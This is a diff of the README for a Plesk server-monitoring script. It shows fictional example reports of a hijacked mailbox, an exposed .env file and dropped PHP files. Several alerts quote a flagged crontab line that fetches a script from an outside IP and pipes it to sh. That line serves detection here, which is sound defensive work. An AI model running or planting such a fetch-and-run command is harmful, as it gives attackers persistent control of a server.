@@ -143,25 +143,40 @@ Just as useful: the reports confirmed what is *fine*. Reverse DNS, HELO name and
 
 ### Example report (fictional data)
 
+The report is ordered by theme – **MAIL, ACCESS, WEB, SYSTEM** –, the alerts at the top too (grouped, the critical ones first in each theme). Each theme starts with `######## THEME ########`, then the sections of the checks that read the logs since the last run, then `== THEME – daily checks (as of …) ==` with the newest results of the daily checks of that theme. Which check goes where:
+
+| Theme | Every run | Daily checks |
+|---|---|---|
+| MAIL | delivery & spam filter, senders & logins, failed logins, webmail | server DNS (PTR, HELO), mail server certificates, SPF/DKIM/DMARC, mailboxes, mail forwarding |
+| ACCESS | successful logins, failed Plesk panel logins, fail2ban, access & persistence | reachable from outside (firewall, databases, installer), SSH access of the system users |
+| WEB | requests and attacks, PHP files in upload folders, failed certificate renewals | TLS certificates, HTTPS, domain DNS, exposed files, suspicious code |
+| SYSTEM | load, CPU, RAM, filesystems, services, backups | updates and script version, kernel modules, PHP versions, rc.local |
+
 ```
-Server report host.example.com – 2026-10-26 10:05 UTC – plesk-server-report v1.5.0
+Server report host.example.com – 2026-10-26 10:05 UTC – plesk-server-report v1.20.1
 STATUS: WARNING (14)
- ! Mail: support@bank-secure.example sent to 700 recipients from this server (mailbox login or script)
+MAIL (7):
  ! Mail: mailbox info@shop.example submitted 140 mails after logins from outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter]) 203.0.113.99 (VN, Example Telecom) – password compromised?
  ! Mail: mailbox info@shop.example used from 12 different IPs – password compromised?
  ! Mail: mailbox info@shop.example sent 140 mails with a foreign sender domain – spam?
+ ! Mail: support@bank-secure.example sent to 700 recipients from this server (mailbox login or script)
  ! Mail: 61 rejections by remote servers mentioning a blocklist, reputation, spam or rate limit – check the server IP and the examples (rejected by: Gmail, Outlook.com/Hotmail, Apple iCloud – what to do: see the report)
  ! Mail: mailbox info@shop.example logged in via IMAP/POP3 from a new country outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter], 48.3 MB of mail read) – travelling, or password compromised?
  ! Mail: 4 failed logins of info@lawfirm.example from 198.51.100.44 (AT, Example Kabel GmbH) – other mailboxes logged in successfully from there: jane@lawfirm.example. A device with an outdated password? Correct it on the device before fail2ban bans the IP (and with it the whole connection)
+ACCESS (2):
+ ! Cron: new entry with suspicious content in crontab of shop_web: */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh – check it
  ! fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)); failed logins from there: iphone@oldname.example ×5 (no such mailbox) – a device still set up for a mailbox that doesn't exist (any more)? Remove that account from the device. Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
- ! Web: blog.example logged 48 PHP fatal errors
+WEB (4):
  ! Web: shop.example served the sensitive file /.env (HTTP 200, file exists) – a request in the access log since the last run; remove the file or block access, and assume it was downloaded
  ! Web: 2 new PHP file(s) in wp-content/uploads – possible malware
- ! Cron: new entry with suspicious content in crontab of shop_web: */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh – check it
- ! Updates: 3 security update(s) pending
  ! Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access, then check again: plesk-server-report.sh --only exposed
+ ! Web: blog.example logged 48 PHP fatal errors
+SYSTEM (1):
+ ! Updates: 3 security update(s) pending
 
-== MAIL ==
+######## MAIL ########
+
+== MAIL: delivery & spam filter ==
 Source: /var/log/maillog, 5212 new lines
 Delivered: 548 | deferred: 87 | bounced: 34 | queue: 4
 Rejections mentioning blocklist/reputation/spam/rate limit: 61
@@ -187,6 +202,7 @@ Spam filter: all mails scanned – none above the size limit (limit 3.0 MB = 314
 Spam filter: blocklist lookups answered (412 mail(s) scanned)
 DNS blocklists for 203.0.113.10 (all queried via 127.0.0.1): zen.spamhaus.org:clean bl.spamcop.net:clean psbl.surriel.com:clean
 
+== MAIL: senders & logins ==
 Top senders (total recipients):
      700  support@bank-secure.example
       12  office@agency.example
@@ -214,6 +230,7 @@ Mails sent by scripts (system user = subscription):
        2  uid 30  popuser  /var/qmail/popuser
        1  uid 999  psaadm  /opt/psa/admin
 
+== MAIL: failed logins ==
 Failed mail logins: SMTP 64 | IMAP/POP3 3 – top IPs:
        9  192.0.2.200 (NL, Example Hosting B.V. [datacenter])
        3  198.51.100.66 (US, Example Cloud Ltd [datacenter])
@@ -226,6 +243,7 @@ Most attacked mailboxes (failed SMTP/IMAP/POP3 logins):
 Failed logins from IPs with earlier successful mail logins (device with an outdated password?):
        4  info@lawfirm.example from 198.51.100.44 (AT, Example Kabel GmbH) – other mailboxes logged in successfully from there: jane@lawfirm.example
 
+== MAIL: webmail (Roundcube) ==
 Webmail (Roundcube) – mails sent (mails, recipients, IPs):
        4      5 rcpt   1 IPs  office@agency.example
           198.51.100.20 (DE, Example Telekom AG) ×4
@@ -236,26 +254,53 @@ Most attacked mailboxes (failed webmail logins):
        9  info@lawfirm.example
        3  admin@agency.example
 
-== SYSTEM ==
-Load: 0.42 / 0.37 / 0.30 (1/5/15 min) on 8 cores | up 12 days, 4 hours, 10 minutes
-%Cpu(s):  3.1 us,  1.0 sy,  0.0 ni, 95.6 id,  0.2 wa,  0.0 hi,  0.1 si,  0.0 st
+== MAIL – daily checks (as of 2026-10-26 01:05 UTC) ==
+Server DNS (reverse DNS / HELO):
+  203.0.113.10 → host.example.com: ok (forward-confirmed)
+  Postfix HELO name: host.example.com (resolves to this server, matches PTR)
+  IPv6: not used for mail (CHECK_IPV6=auto)
+  DNS queried via 1.1.1.1
 
-CPU per system user (snapshot):
-    12.9 %  shopexample
-     4.2 %  mysql
-     2.1 %  root
+Mail server certificates for host.example.com:
+  port 25: name ok, valid 61 more days
+  port 465: name ok, valid 61 more days
+  port 587: name ok, valid 61 more days
+  port 993: name ok, valid 61 more days
+  port 995: name ok, valid 61 more days
 
-Top processes:
-    8.6 %  shopexample  php-fpm
-    4.2 %  mysql        mariadbd
-    4.3 %  shopexample  php-fpm
-    1.3 %  root         fail2ban-server
+Mail authentication (SPF / DKIM / DMARC):
+  nails.example                SPF pass      | DKIM MISSING  | DMARC missing      | MX here | DNS ns1.other-provider.example
+  38 domain(s) OK, 1 with findings. Alert only if SPF and DKIM both fail and the MX points here;
+  a single missing/outdated record is a recommendation (DMARC passes if SPF or DKIM passes).
+  DNS queried via 1.1.1.1
 
-RAM: 11240 of 16000 MB available (70 %) | swap used: 0/2047 MB
+Mailboxes (fill level of the size limit; warning from WARN_MAILBOX_PCT=95 %, without a limit from WARN_MAILBOX_UNLIMITED_GB=5 GB):
+   91 %  office@lawfirm.example  (2.75 GB of 3.00 GB)
+   84 %  jane@agency.example  (423 MB of 500 MB)
+   78 %  info@salon.example  (809 MB of 1.00 GB)
+   77 %  orders@shop.example  (779 MB of 1000 MB)
+   64 %  info@shop.example  (1.07 GB of 1.56 GB)
+  89 mailbox(es) checked; 19 unlimited (no size limit set in Plesk; largest: info@bakery.example 3.21 GB, all together 12.48 GB), 5 without maildirsize (not counted)
 
-Filesystems (space used, inodes used):
-   41%  /  (inodes 6%)
-    8%  /boot/efi
+Mail forwarding to other providers (spam that is only marked is forwarded too):
+  3 address(es) forward to other providers: 2 keep spam back (delete, or move with a copy kept), 1 forward it, 0 without spam filter
+  - spam forwarded too: info@salon.example → gmail.com (spam marked)
+  Recommendation: set the spam filter of these addresses to "Delete spam" (Plesk: Mail → address → Spam Filter,
+  or: plesk bin spamassassin --update ADDRESS -action del) – or to "Move spam to the Spam folder" with copies
+  kept in the mailbox. Marked spam is forwarded, and the receiving provider rates this server for it.
+  Spam filter size limit: 5242880 bytes (5.0 MB)
+  DNS blocklist for incoming mail: zen.spamhaus.org
+
+######## ACCESS ########
+
+== SUCCESSFUL LOGINS (SSH, Plesk panel) ==
+     2× SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
+     1× Plesk admin          from 198.51.100.200   (panel)  DE, Example Telekom AG
+
+== PLESK PANEL: failed logins ==
+Failed panel logins: 7
+  login names: admin ×5, root ×2
+  top IPs: 192.0.2.88 (US, Example Cloud Ltd [datacenter]) ×5, 203.0.113.70 (CN, Example Telecom) ×2
 
 == FAIL2BAN ==
   plesk-courierimap            banned:   9 (total 87), currently failed: 136
@@ -267,6 +312,30 @@ Filesystems (space used, inodes used):
   (jails without bans/failures hidden)
   Banned IPs with earlier successful logins (customer or own device with an outdated password?):
     plesk-courierimap: 198.51.100.77 (DE, Example Kabel GmbH) – earlier successful mail logins of office@lawfirm.example (last 2026-10-25); failed logins from there: iphone@oldname.example ×5 (no such mailbox)
+
+== ACCESS & PERSISTENCE (SSH keys, accounts, sudo, cron, autostart, processes, ports, addresses) ==
+SSH keys (authorized_keys): 2 key(s) of 1 account(s)
+Accounts with a login shell: 2 | sudo group members: 1 | sudoers files: 1
+Cron jobs: 38 entr(y/ies) | autostart files (cron.hourly…monthly, rc.local, systemd units in /etc): 17
+  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
+Processes: 284 checked, 0 suspicious (program in /tmp, /dev/shm or a web folder, deleted, memory only, fake kernel thread)
+Listening TCP ports (not loopback): 21 xinetd, 22 sshd, 25 master, 53 named, 80 nginx, 110 couriertcpd, 143 couriertcpd, 443 nginx, 465 master, 587 master, 993 couriertcpd, 995 couriertcpd, 8443 sw-cp-serverd, 8880 sw-cp-serverd
+IP addresses (global): 203.0.113.10 (eth0)
+
+== ACCESS – daily checks (as of 2026-10-26 01:05 UTC) ==
+Reachable from outside (databases, Plesk installer) – rules of the Plesk Firewall:
+  MySQL/MariaDB (3306): listens only locally (127.0.0.1) – not reachable from outside
+  PostgreSQL (5432): not listening
+  Plesk installer (8447, runs only while used): the firewall allows it only from 198.51.100.7
+  (a firewall in front of the server, e.g. at the hosting provider, is not visible from here)
+
+SSH access of Plesk system users (group psacln, 31 accounts):
+  locked in their web space (chrooted): 29 | full shell: 1 | no SSH (Forbidden, /bin/false, nologin): 1
+  of the 30 with a shell: SFTP only (ForceCommand): 29
+  full shell: deputy (/bin/bash) – allowed (ALLOWED_FULL_SHELL_USERS)
+  keys of deputy: /etc/ssh/authorized_keys/deputy – not changeable by deputy
+
+######## WEB ########
 
 == WEB (since last run) ==
 requests | 5xx | login POSTs | domain | busiest IP
@@ -299,62 +368,11 @@ New since last run: 2
   /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/cache.php
   /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/wp-tmp.php
 
-== SUCCESSFUL LOGINS (SSH, Plesk panel) ==
-     2× SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
-     1× Plesk admin          from 198.51.100.200   (panel)  DE, Example Telekom AG
-
-== PLESK PANEL LOG ==
-Failed panel logins: 7
-  login names: admin ×5, root ×2
-  top IPs: 192.0.2.88 (US, Example Cloud Ltd [datacenter]) ×5, 203.0.113.70 (CN, Example Telecom) ×2
+== CERTIFICATE RENEWALS (Let's Encrypt, from the Plesk panel log) ==
 Failed automatic certificate renewals (Let's Encrypt):
   none
 
-== ACCESS & PERSISTENCE (SSH keys, accounts, sudo, cron, autostart, processes, ports, addresses) ==
-SSH keys (authorized_keys): 2 key(s) of 1 account(s)
-Accounts with a login shell: 2 | sudo group members: 1 | sudoers files: 1
-Cron jobs: 38 entr(y/ies) | autostart files (cron.hourly…monthly, rc.local, systemd units in /etc): 17
-  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
-Processes: 284 checked, 0 suspicious (program in /tmp, /dev/shm or a web folder, deleted, memory only, fake kernel thread)
-Listening TCP ports (not loopback): 21 xinetd, 22 sshd, 25 master, 53 named, 80 nginx, 110 couriertcpd, 143 couriertcpd, 443 nginx, 465 master, 587 master, 993 couriertcpd, 995 couriertcpd, 8443 sw-cp-serverd, 8880 sw-cp-serverd
-IP addresses (global): 203.0.113.10 (eth0)
-
-== SERVICES ==
-Failed units: none
-OOM killer: none
-Crashes: none
-
-== BACKUPS ==
-Plesk backup: last run 2026-10-26 03:15 UTC (6 h ago, backup-2026-10-26-03-15-02-123), status: OK (exit code 0)
-Acronis agent: running
-
-== DAILY CHECKS ==
-As of: 2026-10-26 01:05 UTC
-Updates available: 11, security updates: 3
-  libssl3t64
-  openssl
-  openssh-server
-Script version: 1.7.0 (latest release)
-
-Kernel modules of rarely used network protocols: sctp blocked, dccp blocked, tipc blocked, rds not installed
-
-Reachable from outside (databases, Plesk installer) – rules of the Plesk Firewall:
-  MySQL/MariaDB (3306): listens only locally (127.0.0.1) – not reachable from outside
-  PostgreSQL (5432): not listening
-  Plesk installer (8447, runs only while used): the firewall allows it only from 198.51.100.7
-  (a firewall in front of the server, e.g. at the hosting provider, is not visible from here)
-
-SSH access of Plesk system users (group psacln, 31 accounts):
-  locked in their web space (chrooted): 29 | full shell: 1 | no SSH (Forbidden, /bin/false, nologin): 1
-  of the 30 with a shell: SFTP only (ForceCommand): 29
-  full shell: deputy (/bin/bash) – allowed (ALLOWED_FULL_SHELL_USERS)
-  keys of deputy: /etc/ssh/authorized_keys/deputy – not changeable by deputy
-
-PHP versions (security support per https://www.php.net; domains with PHP: 36):
-  8.3 (8.3.37) – no domain, but the default of 2 service plan(s): Unlimited (reseller reseller1), Default Domain (reseller reseller2) – supported until 2027-12-31 (php.net)
-  8.4 (8.4.28) – 35 domain(s), supported until 2028-12-31 (php.net)
-  8.5 (8.5.13) – 1 domain(s), supported until 2029-12-31 (php.net)
-
+== WEB – daily checks (as of 2026-10-26 01:05 UTC) ==
 TLS certificates:
   all valid certificates are good for at least 14 more days
   no matching certificate (e.g. no SSL, mail-only, redirect): mail-only.example parked.example
@@ -366,19 +384,6 @@ HTTPS (HSTS and http→https redirect; domains with a valid certificate that poi
   23 domain(s) checked
   DNS queried via 1.1.1.1
 
-Server DNS (reverse DNS / HELO):
-  203.0.113.10 → host.example.com: ok (forward-confirmed)
-  Postfix HELO name: host.example.com (resolves to this server, matches PTR)
-  IPv6: not used for mail (CHECK_IPV6=auto)
-  DNS queried via 1.1.1.1
-
-Mail server certificates for host.example.com:
-  port 25: name ok, valid 61 more days
-  port 465: name ok, valid 61 more days
-  port 587: name ok, valid 61 more days
-  port 993: name ok, valid 61 more days
-  port 995: name ok, valid 61 more days
-
 Domain DNS (points here? CAA, DNSSEC, domain blocklists):
   moved.example: website points elsewhere (192.0.2.77, NL, Example Hosting B.V. [datacenter]) – moved? CDN?
   39 domain(s) checked, findings listed above
@@ -388,35 +393,60 @@ Exposed files in document roots (.env, .git, dumps, backups, config copies, info
   shop.example/.env – PUBLICLY REACHABLE (HTTP 200)
   shop.example: 1 file(s) found but blocked by the web server (HTTP 403), e.g. /.git/
   42 document root(s) scanned, 2 finding(s); only publicly reachable ones raise an alert
-  This list is from the daily check (see "As of") and repeats until the next one. After fixing a file, check again right away: plesk-server-report.sh --only exposed – or rm /var/lib/plesk-server-report/daily_date to refresh the daily checks in the next run
+  This list is from the daily check (see "as of" in the heading) and repeats until the next one. After fixing a file, check again right away: plesk-server-report.sh --only exposed – or rm /var/lib/plesk-server-report/daily_date to refresh the daily checks in the next run
 
 Suspicious code in recently changed PHP files, .htaccess and .user.ini (typical webshell/backdoor patterns):
   42 document root(s) scanned, 0 suspicious file(s)
 
-Mail authentication (SPF / DKIM / DMARC):
-  nails.example                SPF pass      | DKIM MISSING  | DMARC missing      | MX here | DNS ns1.other-provider.example
-  38 domain(s) OK, 1 with findings. Alert only if SPF and DKIM both fail and the MX points here;
-  a single missing/outdated record is a recommendation (DMARC passes if SPF or DKIM passes).
-  DNS queried via 1.1.1.1
+######## SYSTEM ########
 
-Mailboxes (fill level of the size limit; warning from WARN_MAILBOX_PCT=95 %, without a limit from WARN_MAILBOX_UNLIMITED_GB=5 GB):
-   91 %  office@lawfirm.example  (2.75 GB of 3.00 GB)
-   84 %  jane@agency.example  (423 MB of 500 MB)
-   78 %  info@salon.example  (809 MB of 1.00 GB)
-   77 %  orders@shop.example  (779 MB of 1000 MB)
-   64 %  info@shop.example  (1.07 GB of 1.56 GB)
-  89 mailbox(es) checked; 19 unlimited (no size limit set in Plesk; largest: info@bakery.example 3.21 GB, all together 12.48 GB), 5 without maildirsize (not counted)
+== LOAD, CPU, RAM, FILESYSTEMS ==
+Load: 0.42 / 0.37 / 0.30 (1/5/15 min) on 8 cores | up 12 days, 4 hours, 10 minutes
+%Cpu(s):  3.1 us,  1.0 sy,  0.0 ni, 95.6 id,  0.2 wa,  0.0 hi,  0.1 si,  0.0 st
 
-Mail forwarding to other providers (spam that is only marked is forwarded too):
-  3 address(es) forward to other providers: 2 keep spam back (delete, or move with a copy kept), 1 forward it, 0 without spam filter
-  - spam forwarded too: info@salon.example → gmail.com (spam marked)
-  Recommendation: set the spam filter of these addresses to "Delete spam" (Plesk: Mail → address → Spam Filter,
-  or: plesk bin spamassassin --update ADDRESS -action del) – or to "Move spam to the Spam folder" with copies
-  kept in the mailbox. Marked spam is forwarded, and the receiving provider rates this server for it.
-  Spam filter size limit: 5242880 bytes (5.0 MB)
-  DNS blocklist for incoming mail: zen.spamhaus.org
+CPU per system user (snapshot):
+    12.9 %  shopexample
+     4.2 %  mysql
+     2.1 %  root
+
+Top processes:
+    8.6 %  shopexample  php-fpm
+    4.2 %  mysql        mariadbd
+    4.3 %  shopexample  php-fpm
+    1.3 %  root         fail2ban-server
+
+RAM: 11240 of 16000 MB available (70 %) | swap used: 0/2047 MB
+
+Filesystems (space used, inodes used):
+   41%  /  (inodes 6%)
+    8%  /boot/efi
+
+== SERVICES ==
+Failed units: none
+OOM killer: none
+Crashes: none
+
+== BACKUPS ==
+Plesk backup: last run 2026-10-26 03:15 UTC (6 h ago, backup-2026-10-26-03-15-02-123), status: OK (exit code 0)
+Acronis agent: running
+
+== SYSTEM – daily checks (as of 2026-10-26 01:05 UTC) ==
+Updates available: 11, security updates: 3
+  libssl3t64
+  openssl
+  openssh-server
+Script version: 1.20.1 (latest release)
+
+Kernel modules of rarely used network protocols: sctp blocked, dccp blocked, tipc blocked, rds not installed
+
+PHP versions (security support per https://www.php.net; domains with PHP: 36):
+  8.3 (8.3.37) – no domain, but the default of 2 service plan(s): Unlimited (reseller reseller1), Default Domain (reseller reseller2) – supported until 2027-12-31 (php.net)
+  8.4 (8.4.28) – 35 domain(s), supported until 2028-12-31 (php.net)
+  8.5 (8.5.13) – 1 domain(s), supported until 2029-12-31 (php.net)
 
 rc.local: not used (/etc/rc.local doesn't exist)
+
+Daily checks took 3 min 12 s (slowest: domaindns 71 s, https 48 s, exposed 22 s)
 
 IP geolocation: DB-IP.com Lite databases (CC BY 4.0)
 ```
@@ -427,8 +457,8 @@ The report above is what a hijacked mailbox and a hacked WordPress site look lik
 <summary><b>Example <code>summary.txt</code></b> (the same day, condensed from all reports of the last 24 hours – 24 with the hourly cron job, 12 if it runs every 2 hours; fictional data, shortened)</summary>
 
 ```
-Server summary host.example.com – last 24 h: 24 report(s), 2026-10-25 11:05 UTC to 2026-10-26 10:05 UTC – plesk-server-report v1.5.0
-Built from the reports of this period. Daily checks and fail2ban: see latest.txt. Details of a run: report-<date>-<time>.txt
+Server summary host.example.com – last 24 h: 24 report(s), 2026-10-25 11:05 UTC to 2026-10-26 10:05 UTC – plesk-server-report v1.20.1
+Built from the reports of this period, in their themes: MAIL, ACCESS, WEB, SYSTEM – totals and peaks of the hourly checks, and the newest results of the daily checks. Details of a run: report-<date>-<time>.txt
 
 == RUNS (time, status) ==
   2026-10-25 11:05 UTC  STATUS: OK
@@ -438,20 +468,28 @@ Built from the reports of this period. Daily checks and fail2ban: see latest.txt
   2026-10-26 01:05 UTC  STATUS: WARNING (2)
   …
   2026-10-26 09:05 UTC  STATUS: WARNING (5)
-  2026-10-26 10:05 UTC  STATUS: WARNING (13)
+  2026-10-26 10:05 UTC  STATUS: WARNING (14)
 
-== ALERTS (times seen, first – last, text) ==
-   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Updates: 3 security update(s) pending
-   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access, then check again: plesk-server-report.sh --only exposed
-    6×  2026-10-26 05:05 UTC – 2026-10-26 10:05 UTC  fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)); failed logins from there: iphone@oldname.example ×5 (no such mailbox) – a device still set up for a mailbox that doesn't exist (any more)? Remove that account from the device. Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
+== ALERTS (by theme, the critical ones first; times seen, first – last, text) ==
+MAIL (7):
     1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example used from 5 different IPs – password compromised?
     1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example sent 23 mails with a foreign sender domain – spam?
-    1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example logged in via IMAP/POP3 from a new country outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter], 48.3 MB of mail read) – travelling, or password compromised?
     1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  Mail: support@bank-secure.example sent to 700 recipients from this server (mailbox login or script)
+    1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example logged in via IMAP/POP3 from a new country outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter], 48.3 MB of mail read) – travelling, or password compromised?
     1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  Mail: 61 rejections by remote servers mentioning a blocklist, reputation, spam or rate limit – check the server IP and the examples
     …
+ACCESS (2):
+    1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  Cron: new entry with suspicious content in crontab of shop_web: */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh – check it
+    6×  2026-10-26 05:05 UTC – 2026-10-26 10:05 UTC  fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)); failed logins from there: iphone@oldname.example ×5 (no such mailbox) – a device still set up for a mailbox that doesn't exist (any more)? Remove that account from the device. Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
+WEB (4):
+   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access, then check again: plesk-server-report.sh --only exposed
+    …
+SYSTEM (1):
+   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Updates: 3 security update(s) pending
 
-== MAIL ==
+######## MAIL ########
+
+== MAIL: delivery & spam filter (totals) ==
 Delivered: 2276 | deferred: 91 | bounced: 36 | highest queue: 4 (2026-10-26 10:05 UTC)
 Rejections mentioning blocklist/reputation/spam/rate limit: 61
   example (2026-10-26 10:05 UTC): Oct 26 09:41:12 gmail.com: host gmail-smtp-in.l.google.com[192.0.2.26] said: 421-4.7.28 [203.0.113.10] Gmail has detected an unusual rate of unsolicited mail …
@@ -472,6 +510,7 @@ Full mailboxes (rejected delivery attempts in total, first – last):
 Spam filter: all mails scanned (limit 3.0 MB = 3145728 bytes)
 DNS blocklists for the server IP: not listed in any run
 
+== MAIL: senders & logins (totals) ==
 Authenticated mailboxes (mails in total; every client IP seen):
      163  info@shop.example
           198.51.100.4 (DE, Example Telekom AG) ×3
@@ -489,27 +528,76 @@ Mailboxes sending with a foreign sender domain (login ≠ from):
   2026-10-26 09:05 UTC  23  info@shop.example – e.g. support@bank-secure.example
   2026-10-26 10:05 UTC  140  info@shop.example – e.g. support@bank-secure.example
 
+== MAIL: failed logins (totals) ==
 Failed mail logins: SMTP 1312 | IMAP/POP3 41 in total, most in one run: 118 (2026-10-26 03:05 UTC)
 …
 
-== SYSTEM ==
-Highest 5-min load: 2.84 (2026-10-26 03:05 UTC) on 8 cores | lowest available RAM: 61 % (2026-10-26 03:05 UTC)
+== MAIL – daily checks (as of 2026-10-26 01:05 UTC) ==
+Mailboxes (fill level of the size limit; warning from WARN_MAILBOX_PCT=95 %, without a limit from WARN_MAILBOX_UNLIMITED_GB=5 GB):
+   91 %  office@lawfirm.example  (2.75 GB of 3.00 GB)
+   …
+
+######## ACCESS ########
+
+== SUCCESSFUL LOGINS (SSH, Plesk panel; count, first – last) ==
+     9×  2026-10-25 14:05 UTC – 2026-10-26 10:05 UTC  SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
+     2×  2026-10-26 08:05 UTC – 2026-10-26 10:05 UTC  Plesk admin          from 198.51.100.200   (panel)  DE, Example Telekom AG
+
+== PLESK PANEL: failed logins (totals) ==
+Failed panel logins: 61 in total, most in one run: 9 (2026-10-26 03:05 UTC)
+  login names: admin ×44, root ×17
+  top IPs: 192.0.2.88 (US, Example Cloud Ltd [datacenter]) ×31, 203.0.113.70 (CN, Example Telecom) ×12, …
+
+== FAIL2BAN (per jail: banned now, total, failed now – newest report; most banned at once) ==
+  plesk-courierimap            banned:   9 (total 87), currently failed: 136 | most banned: 14 (2026-10-26 05:05 UTC)
+  recidive                     banned: 286 (total 561), currently failed: 242 | most banned: 286 (2026-10-26 10:05 UTC)
+  ssh                          banned:   5 (total 1251), currently failed: 20 | most banned: 11 (2026-10-25 22:05 UTC)
+  …
+  Banned IPs with earlier successful logins (count, first – last):
+     6×  2026-10-26 05:05 UTC – 2026-10-26 10:05 UTC  plesk-courierimap: 198.51.100.77 (DE, Example Kabel GmbH) – earlier successful mail logins of office@lawfirm.example (last 2026-10-25); failed logins from there: iphone@oldname.example ×5 (no such mailbox)
+
+== ACCESS & PERSISTENCE (changes + − ~ and findings !; count, first – last) ==
+     1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
+
+== ACCESS – daily checks (as of 2026-10-26 01:05 UTC) ==
+Reachable from outside (databases, Plesk installer) – rules of the Plesk Firewall:
+  MySQL/MariaDB (3306): listens only locally (127.0.0.1) – not reachable from outside
+  …
+
+######## WEB ########
+
+== WEB (totals) ==
 …
-Backups (newest report):
-  Plesk backup: last run 2026-10-26 03:15 UTC (6 h ago, backup-2026-10-26-03-15-02-123), status: OK (exit code 0)
-  Acronis agent: running
 
 == WEBROOTS: PHP files in upload folders ==
 New in this period: 2
   2026-10-26 10:05 UTC  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/cache.php
   2026-10-26 10:05 UTC  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/wp-tmp.php
 
-== SUCCESSFUL LOGINS (SSH, Plesk panel; count, first – last) ==
-     9×  2026-10-25 14:05 UTC – 2026-10-26 10:05 UTC  SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
-     2×  2026-10-26 08:05 UTC – 2026-10-26 10:05 UTC  Plesk admin          from 198.51.100.200   (panel)  DE, Example Telekom AG
+== CERTIFICATE RENEWALS (failed Let's Encrypt renewals: count, domain, first – last, reason) ==
+  none
 
-== ACCESS & PERSISTENCE (changes + − ~ and findings !; count, first – last) ==
-     1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
+== WEB – daily checks (as of 2026-10-26 01:05 UTC) ==
+Exposed files in document roots (.env, .git, dumps, backups, config copies, info/admin tools):
+  shop.example/.env – PUBLICLY REACHABLE (HTTP 200)
+  …
+
+######## SYSTEM ########
+
+== LOAD, CPU, RAM, FILESYSTEMS ==
+Highest 5-min load: 2.84 (2026-10-26 03:05 UTC) on 8 cores | lowest available RAM: 61 % (2026-10-26 03:05 UTC)
+…
+
+== SERVICES ==
+Failed services / OOM killer / crashes: none in any run
+
+== BACKUPS (newest report) ==
+  Plesk backup: last run 2026-10-26 03:15 UTC (6 h ago, backup-2026-10-26-03-15-02-123), status: OK (exit code 0)
+  Acronis agent: running
+
+== SYSTEM – daily checks (as of 2026-10-26 01:05 UTC) ==
+Updates available: 11, security updates: 3
+  …
 ```
 
 The summary shows what a single report can't: the first signs at 09:05 (the first IMAP login from Brazil, five IPs, 23 mails with a foreign sender), the escalation an hour later with the big providers throttling the server, and that the exposed `.env` had been reported since the daily check at 01:05.
@@ -551,7 +639,7 @@ Besides the text report the script can write a machine-readable copy of every ru
     "mail_delivered": 812, "mail_deferred": 240, "mail_queue": 12, "web_5xx": 31
   },
   "sections": [
-    {"check": "mail", "daily": false, "title": "MAIL", "lines": ["Delivered: 812 | deferred: 240 | bounced: 3 | queue: 12", "…"]}
+    {"check": "mail", "daily": false, "title": "MAIL: delivery & spam filter", "lines": ["Delivered: 812 | deferred: 240 | bounced: 3 | queue: 12", "…"]}
   ],
   "daily_as_of": "2026-11-14 00:05 UTC",
   "geo": "DB-IP.com Lite databases (CC BY 4.0)"
@@ -566,7 +654,7 @@ Besides the text report the script can write a machine-readable copy of every ru
 | `alerts` | every alert of the text report, in the same order. `severity`: `critical` or `warning` (see *Severity* below). `check` is the check that raised it (names as in `--list`; `script` for the script's own alerts, `daily` for daily checks cached before `JSON_REPORT` was switched on). `daily`: from the daily checks. `key`: the alert without its figures – stable from run to run, for "new / known / gone". `new`: the key was not in any report of the last 24 hours. |
 | `notes` | the ` i ` lines: missing or shortened data |
